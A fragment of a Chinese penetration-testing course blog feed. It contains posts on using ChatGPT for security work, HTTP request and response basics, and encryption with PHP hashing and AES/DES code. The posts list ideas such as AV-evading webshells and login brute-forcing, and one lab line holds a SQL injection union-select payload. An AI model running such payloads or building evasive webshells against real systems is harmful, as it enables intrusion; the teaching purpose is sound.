        <content type="html"><![CDATA[<h2 id="Chatgpt大概科普"><a href="#Chatgpt大概科普" class="headerlink" title="Chatgpt大概科普"></a>Chatgpt大概科普</h2><h3 id="1、ChatGPT是什么"><a href="#1、ChatGPT是什么" class="headerlink" title="1、ChatGPT是什么?"></a>1、ChatGPT是什么?</h3><p><a href="https://openai.com/blog/chatgpt/">https://openai.com/blog/chatgpt/</a><br>ChatGPT–可能很多人被这个缩写的名字搞糊涂了，第一眼无法看出到底什么意思，GPT 的英文原文是 Generative Pre-training Transformer（预训练生成模型），业界有人将 ChatGPT 概括为聊天机器人+搜索工具+文本创造工具的组合，或者简单理解它是一个生成式 AI（内容生成器）。</p><h3 id="2、ChatGPT能做什么？"><a href="#2、ChatGPT能做什么？" class="headerlink" title="2、ChatGPT能做什么？"></a>2、ChatGPT能做什么？</h3><p>它的主要功能是协助回答问题、提供信息和生成有关历史、科学、地理等各种主题的信息，这些信息仅限于它所接受的训练，但其知识在不断扩展。</p><h3 id="3、ChatGPT牛在哪里？"><a href="#3、ChatGPT牛在哪里？" class="headerlink" title="3、ChatGPT牛在哪里？"></a>3、ChatGPT牛在哪里？</h3><p>(1）它是个通用的模型，只要提示词引导，就能快速适应不同领域。<br>(2）它能理解你的问题，只要给的引导越多，它就能给出你想要的答案。<br>安全行业影响：<br>(1）整合多种恶意软件<br>(2）提升漏洞发现能力<br>(3）给新手攻击者赋能<br>(4）便于社会工程学攻击<br>(5）快速筛选和锁定目标<br>(6）模拟网络防御攻击技术<br>利用：<br>– 安全开发<br>1、如何使用Python写一个jwt爆破脚本？<br>2、如何使用Python写一个Webshell检测脚本？<br>3、如何使用Python写一个MS17010漏洞检测脚本？<br>4、使用PHP开发一个免杀混淆复杂的webshell脚本<br>4.1、在渗透测试靶机中，发现PHP脚本被禁用了敏感函数，如何生成一个绕过的webshell<br>– 逆向免杀</p><ul><li>注册教程<br>百度即可</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10基础入门-请求返回包</title>
      <link href="/2023/10/03/10%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E8%AF%B7%E6%B1%82%E8%BF%94%E5%9B%9E%E5%8C%85/"/>
      <url>/2023/10/03/10%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E8%AF%B7%E6%B1%82%E8%BF%94%E5%9B%9E%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/02/1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%BA%94%E7%94%A8%E6%9E%B6%E6%9E%84/">1基础入门</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>21、HTTP&#x2F;S数据包请求与返回</li><li>22、请求包头部常见解释和应用</li><li>23、返回包状态码值解释和应用</li><li>24、HTTP&#x2F;S测试工具Postman使用</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>应用架构：Web&#x2F;APP&#x2F;云应用&#x2F;小程序&#x2F;负载均衡等</li><li>安全产品：CDN&#x2F;WAF&#x2F;IDS&#x2F;IPS&#x2F;蜜罐&#x2F;防火墙&#x2F;杀毒等</li><li>渗透命令：文件上传下载&#x2F;端口服务&#x2F;Shell反弹等</li><li>抓包技术：HTTP&#x2F;TCP&#x2F;UDP&#x2F;ICMP&#x2F;DNS&#x2F;封包&#x2F;代理等</li><li>算法加密：数据编码&#x2F;密码算法&#x2F;密码保护&#x2F;反编译&#x2F;加壳等</li></ul><p><img src="/2023/10/03/10%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E8%AF%B7%E6%B1%82%E8%BF%94%E5%9B%9E%E5%8C%85/proxy.png" alt="代理请求"><br><img src="/2023/10/03/10%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E8%AF%B7%E6%B1%82%E8%BF%94%E5%9B%9E%E5%8C%85/request.png" alt="request包"><br><img src="/2023/10/03/10%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E8%AF%B7%E6%B1%82%E8%BF%94%E5%9B%9E%E5%8C%85/response.png" alt="response包"><br><img src="/2023/10/03/10%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E8%AF%B7%E6%B1%82%E8%BF%94%E5%9B%9E%E5%8C%85/get.png" alt="get请求"><br><img src="/2023/10/03/10%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E8%AF%B7%E6%B1%82%E8%BF%94%E5%9B%9E%E5%8C%85/post.png" alt="post请求">  </p><h2 id="数据-方法-头部-状态码"><a href="#数据-方法-头部-状态码" class="headerlink" title="数据-方法&amp;头部&amp;状态码"></a>数据-方法&amp;头部&amp;状态码</h2><ul><li><p>方法<br>1、常规请求-Get<br>2、用户登录-Post<br>•get：向特定资源发出请求（请求指定页面信息，并返回实体主体）；<br>•post：向指定资源提交数据进行处理请求（提交表单、上传文件），又可能导致新的资源的建立或原有资源的修改；<br>•head：与服务器索与get请求一致的相应，响应体不会返回，获取包含在小消息头中的原信息（与get请求类似，返回的响应中没有具体内容，用于获取报头）；<br>•put：向指定资源位置上上传其最新内容（从客户端向服务器传送的数据取代指定文档的内容），与post的区别是put为幂等，post为非幂等；<br>•trace：回显服务器收到的请求，用于测试和诊断。trace是http8种请求方式之中最安全的l<br>•delete：请求服务器删除request-URL所标示的资源<em>（请求服务器删除页面）<br>•option：返回服务器针对特定资源所支持的HTML请求方法 或web服务器发送</em>测试服务器功能（允许客户 端查看服务器性能）；<br>•connect ： HTTP&#x2F;1.1协议中能够将连接改为管道方式的代理服务器  </p></li><li><p>参数<br>演示：<br>1、UA头-设备平台<br>2、Cookie-身份替换<br>见上图  </p></li><li><p>Response状态码<br>1、数据是否正常<br>2、文件是否存在<br>3、地址自动跳转<br>4、服务提供错误<br>注：容错处理识别  </p><table><thead><tr><th>状态码</th><th>描述</th></tr></thead><tbody><tr><td>-1xx</td><td>指示信息—表示请求已接收，继续处理。</td></tr><tr><td>-2xx</td><td>成功—表示请求已经被成功接收、理解、接受。</td></tr><tr><td>-3xx</td><td>重定向—要完成请求必须进行更进一步的操作。</td></tr><tr><td>-4xx</td><td>客户端错误—请求有语法错误或请求无法实现。</td></tr><tr><td>-5xx</td><td>服务器端错误—服务器未能实现合法的请求。</td></tr><tr><td>-200</td><td>OK：客户端请求成功</td></tr><tr><td>-301</td><td>redirect：页面永久性移走，服务器进行重定向跳转；</td></tr><tr><td>-302</td><td>redirect：页面暂时性移走，服务器进行重定向跳转，具有被劫持的安全风险；</td></tr><tr><td>-400</td><td>BadRequest：由于客户端请求有语法错误，不能被服务器所理解；</td></tr><tr><td>-401</td><td>Unauthonzed：请求未经授权。</td></tr><tr><td>-403</td><td>Forbidden：服务器收到请求，但是拒绝提供服务。</td></tr><tr><td>-404</td><td>NotFound：请求的资源不存在，例如，输入了错误的URL；</td></tr><tr><td>-500</td><td>InternalServerError：服务器发生不可预期的错误，无法完成客户端的请求；</td></tr><tr><td>-503</td><td>ServiceUnavailable：服务器当前不能够处理客户端的请求</td></tr></tbody></table></li></ul><h2 id="案例-文件探针-登录爆破"><a href="#案例-文件探针-登录爆破" class="headerlink" title="案例-文件探针&amp;登录爆破"></a>案例-文件探针&amp;登录爆破</h2><p>-实验：<br>1、页面正常访问<br>2、网站文件探针<br>3、后台登录爆破  </p><h2 id="工具-Postman自构造使用"><a href="#工具-Postman自构造使用" class="headerlink" title="工具-Postman自构造使用"></a>工具-Postman自构造使用</h2><p><a href="https://zhuanlan.zhihu.com/p/551703621">https://zhuanlan.zhihu.com/p/551703621</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9基础入门-算法加密</title>
      <link href="/2023/10/03/9%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%AE%97%E6%B3%95%E5%8A%A0%E5%AF%86/"/>
      <url>/2023/10/03/9%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%AE%97%E6%B3%95%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/02/1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%BA%94%E7%94%A8%E6%9E%B6%E6%9E%84/">1基础入门</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>17、单向散列加密 -MD5，HASH</li><li>18、对称加密 -AES DES</li><li>19、非对称加密 -RSA</li><li>20、解密-识别&amp;需求&amp;寻找(前后端)&amp;操作</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>应用架构：Web&#x2F;APP&#x2F;云应用&#x2F;小程序&#x2F;负载均衡等</li><li>安全产品：CDN&#x2F;WAF&#x2F;IDS&#x2F;IPS&#x2F;蜜罐&#x2F;防火墙&#x2F;杀毒等</li><li>渗透命令：文件上传下载&#x2F;端口服务&#x2F;Shell反弹等</li><li>抓包技术：HTTP&#x2F;TCP&#x2F;UDP&#x2F;ICMP&#x2F;DNS&#x2F;封包&#x2F;代理等</li><li>算法加密：数据编码&#x2F;密码算法&#x2F;密码保护&#x2F;反编译&#x2F;加壳等</li></ul><p><img src="/2023/10/03/9%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%AE%97%E6%B3%95%E5%8A%A0%E5%AF%86/AES.png"><br><img src="/2023/10/03/9%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%AE%97%E6%B3%95%E5%8A%A0%E5%AF%86/%E5%8A%A0%E5%AF%862.png"><br><img src="/2023/10/03/9%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%AE%97%E6%B3%95%E5%8A%A0%E5%AF%86/%E5%8A%A0%E5%AF%863.png">  </p><ul><li>安全测试中：<br>密文-有源码直接看源码分析算法（后端必须要有源码才能彻底知道）<br>密文-没有源码：1、猜识别 2、看前端JS（加密逻辑是不是在前端）</li></ul><h2 id="算法加密-概念-分类-类型"><a href="#算法加密-概念-分类-类型" class="headerlink" title="算法加密-概念&amp;分类&amp;类型"></a>算法加密-概念&amp;分类&amp;类型</h2><h3 id="1-单向散列加密-MD5"><a href="#1-单向散列加密-MD5" class="headerlink" title="1. 单向散列加密 -MD5"></a>1. 单向散列加密 -MD5</h3><p>单向散列加密算法的优点有(以MD5为例)：<br>&nbsp;&nbsp;&nbsp;&nbsp;方便存储，损耗低：加密对于性能的损耗微乎其微。<br>&nbsp;&nbsp;&nbsp;&nbsp;单向散列加密的缺点就是存在暴力破解的可能性，最好通过加盐值的方式提高安全性，此外可能存在散列冲突。我们都知道MD5加密也是可以破解(碰撞解密)的。<br>常见的单向散列加密算法有：<br>&nbsp;&nbsp;&nbsp;&nbsp;MD5 SHA MAC CRC  </p><h3 id="2-对称加密-AES"><a href="#2-对称加密-AES" class="headerlink" title="2. 对称加密 -AES"></a>2. 对称加密 -AES</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;对称加密优点是算法公开、计算量小、加密速度快、加密效率高。<br>&nbsp;&nbsp;&nbsp;&nbsp;缺点是发送方和接收方必须商定好密钥，然后使双方都能保存好密钥，密钥管理成为双方的负担。<br>常见的对称加密算法有：<br>&nbsp;&nbsp;&nbsp;&nbsp;DES AES RC4<br>（aes关键在key、偏移量、模式；des关键在key、偏移量、填充、模式）  </p><h3 id="3-非对称加密-RSA"><a href="#3-非对称加密-RSA" class="headerlink" title="3. 非对称加密 -RSA"></a>3. 非对称加密 -RSA</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;非对称加密的优点是与对称加密相比，安全性更好，加解密需要不同的密钥，公钥和私钥都可进行相互的加解密。<br>&nbsp;&nbsp;&nbsp;&nbsp;缺点是加密和解密花费时间长、速度慢，只适合对少量数据进行加密。<br>常见的非对称加密算法：<br>&nbsp;&nbsp;&nbsp;&nbsp;RSA RSA2 PKCS</p><h2 id="加密解密-识别特征-解密条件"><a href="#加密解密-识别特征-解密条件" class="headerlink" title="加密解密-识别特征&amp;解密条件"></a>加密解密-识别特征&amp;解密条件</h2><h3 id="MD5密文特点："><a href="#MD5密文特点：" class="headerlink" title="MD5密文特点："></a>MD5密文特点：</h3><ul><li>1、由数字“0-9”和字母“a-f”所组成的字符串  </li><li>2、固定的位数 16 和 32位<br>解密需求：密文即可，但复杂明文可能解不出</li></ul><h3 id="BASE64编码特点："><a href="#BASE64编码特点：" class="headerlink" title="BASE64编码特点："></a>BASE64编码特点：</h3><ul><li>1、大小写区分，通过数字和字母的组合</li><li>2、一般情况下密文尾部都会有两个等号，明文很少的时候则没有</li><li>3、明文越长密文越长，一般不会出现”&#x2F;“”+”在密文中</li></ul><h3 id="AES、DES密文特点："><a href="#AES、DES密文特点：" class="headerlink" title="AES、DES密文特点："></a>AES、DES密文特点：</h3><p>同BASE64基本类似，但一般会出现”&#x2F;“和”+”在密文中<br>解密需求：密文，模式，加密Key，偏移量，条件满足才可解出  </p><h3 id="RSA密文特点："><a href="#RSA密文特点：" class="headerlink" title="RSA密文特点："></a>RSA密文特点：</h3><p>特征同AES,DES相似，但是长度较长<br>解密需求：密文，公钥或私钥即可解出  </p><h3 id="其他密文特点见："><a href="#其他密文特点见：" class="headerlink" title="其他密文特点见："></a>其他密文特点见：</h3><p>1.30余种加密编码类型的密文特征分析（建议收藏）<br><a href="https://mp.weixin.qq.com/s?__biz=MzAwNDcxMjI2MA==&mid=2247484455&idx=1&sn=e1b4324ddcf7d6123be30d9a5613e17b&chksm=9b26f60cac517f1a920cf3b73b3212a645aeef78882c47957b9f3c2135cb7ce051c73fe77bb2&mpshare=1&scene=23&srcid=1111auAYWmr1N0NAs9Wp2hGz&sharer_sharetime=1605145141579&sharer_shareid=5051b3eddbbe2cb698aedf9452370026#rd">https://mp.weixin.qq.com/s?__biz=MzAwNDcxMjI2MA==&amp;mid=2247484455&amp;idx=1&amp;sn=e1b4324ddcf7d6123be30d9a5613e17b&amp;chksm=9b26f60cac517f1a920cf3b73b3212a645aeef78882c47957b9f3c2135cb7ce051c73fe77bb2&amp;mpshare=1&amp;scene=23&amp;srcid=1111auAYWmr1N0NAs9Wp2hGz&amp;sharer_sharetime=1605145141579&amp;sharer_shareid=5051b3eddbbe2cb698aedf9452370026#rd</a>  </p><p>2.CTF中常见密码题解密网站总结（建议收藏）<br><a href="https://blog.csdn.net/qq_41638851/article/details/100526839">https://blog.csdn.net/qq_41638851/article/details/100526839</a>  </p><p>3.CTF密码学常见加密解密总结（建议收藏）<br><a href="https://blog.csdn.net/qq_40837276/article/details/83080460">https://blog.csdn.net/qq_40837276/article/details/83080460</a>  </p><h2 id="解密实例-密文存储-数据传输"><a href="#解密实例-密文存储-数据传输" class="headerlink" title="解密实例-密文存储&amp;数据传输"></a>解密实例-密文存储&amp;数据传输</h2><h3 id="1、密码存储（后端处理）"><a href="#1、密码存储（后端处理）" class="headerlink" title="1、密码存储（后端处理）"></a>1、密码存储（后端处理）</h3><ul><li>X3.2-md5&amp;salt<br>DZ对应代码段-&#x2F;uc_server&#x2F;model&#x2F;user.php  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="variable">$salt</span>);  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line"><span class="variable">$h</span> = <span class="string">&#x27;d7192407bb4bfc83d28f374b6812fbcd&#x27;</span>;  </span><br><span class="line"><span class="variable">$hash</span>=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;123456&#x27;</span>).<span class="string">&#x27;3946d5&#x27;</span>);  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$h</span>==<span class="variable">$hash</span>)&#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure></li><li>X3.5-hash<br>DZ对应代码段-&#x2F;uc_server&#x2F;model&#x2F;user.php <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable">$salt</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">generate_password</span>(<span class="variable">$password</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_password</span>(<span class="params"><span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$algo</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_passwordalgo</span>();</span><br><span class="line"><span class="variable">$options</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_passwordoptions</span>();</span><br><span class="line"><span class="variable">$hash</span> = <span class="title function_ invoke__">password_hash</span>(<span class="variable">$password</span>, <span class="variable">$algo</span>, <span class="variable">$options</span>);</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line"><span class="variable">$hash</span> = <span class="string">&#x27;$2y$10$KA.7VYVheqod8F3X65tWjO3ZXfozNA2fC4oIZoDSu/TbfgKmiw7xO&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">password_verify</span>(<span class="string">&#x27;123456&#x27;</span>, <span class="variable">$hash</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure></li></ul><h3 id="2、数据通讯"><a href="#2、数据通讯" class="headerlink" title="2、数据通讯"></a>2、数据通讯</h3><ul><li>博客登录-zblog（前端处理）<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;script/md5.js&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">$(<span class="string">&quot;#btnPost&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> strPassWord=$(<span class="string">&quot;#edtPassWord&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">    $(<span class="string">&quot;form&quot;</span>).<span class="title function_">attr</span>(<span class="string">&quot;action&quot;</span>,<span class="string">&quot;cmd.php?act=verify&quot;</span>);</span><br><span class="line">    $(<span class="string">&quot;#password&quot;</span>).<span class="title function_">val</span>(<span class="title class_">MD5</span>(strPassWord));  </span><br></pre></td></tr></table></figure></li><li>墨者靶场-（后端处理） <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select 1,database(),user(),4_mozhe</span><br><span class="line">xgd58ipTrnx8VzSBJicqCibZxIRsZKgXOYUrNQP8fCCtx9JZ+6K1hHt7RKkzV305</span><br><span class="line">eGdkNThpcFRybng4VnpTQkppY3FDaWJaeElSc1pLZ1hPWVVyTlFQOGZDQ3R4OUpaKzZLMWhIdDdSS2t6VjMwNQ==  </span><br></pre></td></tr></table></figure>&#x2F;&#x2F;PHP7.3加密演示代码块  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//aes</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">vendor</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EncryptionTool</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">enAES</span>(<span class="params"><span class="variable">$originTxt</span>, <span class="variable">$key</span></span>): <span class="title">string</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$originTxt</span>, <span class="string">&#x27;AES-128-ECB&#x27;</span>,<span class="variable">$key</span>, OPENSSL_RAW_DATA));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">deAES</span>(<span class="params"><span class="variable">$originTxt</span>, <span class="variable">$key</span></span>): <span class="title">string</span></span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$originTxt</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$data</span>,<span class="string">&#x27;AES-128-ECB&#x27;</span>,<span class="variable">$key</span>, OPENSSL_RAW_DATA);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>&#x2F;&#x2F;des<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DES</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string $method 加解密方法，可通过 openssl_get_cipher_methods() 获得</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string $key 加解密的密钥</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string $output 输出格式 无、base64、hex</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$output</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string $iv 加解密的向量</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$iv</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string $options</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span>;</span><br><span class="line">    <span class="comment">// output 的类型</span></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">OUTPUT_NULL</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">OUTPUT_BASE64</span> = <span class="string">&#x27;base64&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">OUTPUT_HEX</span> = <span class="string">&#x27;hex&#x27;</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * DES constructor.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $key</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $method</span></span><br><span class="line"><span class="comment">     *      ECB DES-ECB、DES-EDE3 （为 ECB 模式时，$iv 为空即可）</span></span><br><span class="line"><span class="comment">     *      CBC DES-CBC、DES-EDE3-CBC、DESX-CBC</span></span><br><span class="line"><span class="comment">     *      CFB DES-CFB8、DES-EDE3-CFB8</span></span><br><span class="line"><span class="comment">     *      CTR</span></span><br><span class="line"><span class="comment">     *      OFB</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $output</span></span><br><span class="line"><span class="comment">     *      base64、hex</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $iv</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> int $options</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$method</span> = <span class="string">&#x27;DES-ECB&#x27;</span>, <span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$iv</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$options</span> = OPENSSL_RAW_DATA | OPENSSL_NO_PADDING</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;output = <span class="variable">$output</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;iv = <span class="variable">$iv</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options = <span class="variable">$options</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span 